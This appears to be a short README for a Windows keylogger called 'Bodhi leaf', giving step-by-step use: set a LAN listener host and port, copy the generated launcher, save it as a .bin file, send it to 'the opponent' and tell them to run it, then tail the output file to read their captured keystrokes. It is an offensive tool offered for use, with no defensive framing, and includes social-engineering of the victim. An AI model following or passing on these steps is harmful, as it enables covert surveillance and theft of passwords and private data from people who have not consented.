Hi !!! ,Bodhi leaf keylogger was created to record keystroke typing objects using Windows operating system
It's really easy to use:

Run Python file in the project
set host < IP address in LAN >
set port < Depending on how you choose here, I will choose to be 8080 >
run 
 [+] Keylogger launcher is: (Please Coppy the quarantine code)
step2
Save the script as a file .bin
send it to the opponent and tell the object to run the bin file
step3
revisit my keylogger project
cd Output
tail -f <file.txt>
done !!!
